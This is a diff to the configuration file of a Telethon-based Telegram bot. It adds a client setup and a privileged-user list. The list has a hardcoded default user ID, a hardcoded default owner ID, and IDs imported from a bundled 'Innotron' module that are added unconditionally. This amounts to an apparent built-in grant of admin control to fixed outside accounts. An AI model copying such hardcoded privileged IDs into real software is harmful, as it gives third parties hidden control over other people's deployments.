@@ -1,5 +1,11 @@
 import re
 from os import getenv
+import logging
+
+from telethon import TelegramClient
+
+from os import getenv
+from INNOCENTBOTS.data import Innotron
 # ------------------------------------
 # ------------------------------------
 from dotenv import load_dotenv
@@ -11,6 +17,7 @@ load_dotenv()
 # -----------------------------------------------------
 API_ID = int(getenv("API_ID"))
 API_HASH = getenv("API_HASH")
+CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 # ------------------------------------------------------
 BOT_TOKEN = getenv("BOT_TOKEN")
 # -------------------------------------------------------
@@ -73,8 +80,12 @@ SUPPORT_CHAT = getenv("SUPPORT_CHAT", "https://t.me/THE_FUCKER_BOTS_2926")
 # -------------------------------------------------------------------------------
 
 
+SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="7187959019").split()))
 
-
+for x in Innotron:
+    SUDO_USERS.append(x)
+OWNER_ID = int(getenv("OWNER_ID", default="6961211249"))
+SUDO_USERS.append(OWNER_ID)
 
 
 
@@ -185,3 +196,6 @@ if SUPPORT_CHAT:
 # ---------------------------------------------------------------------------------------
 # ----------------------------------------------------------------------------------------
 # ----------------------------------------------------------------------------------------
+
+# ------------- CLIENTS -------------
+X1 = TelegramClient('X1', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
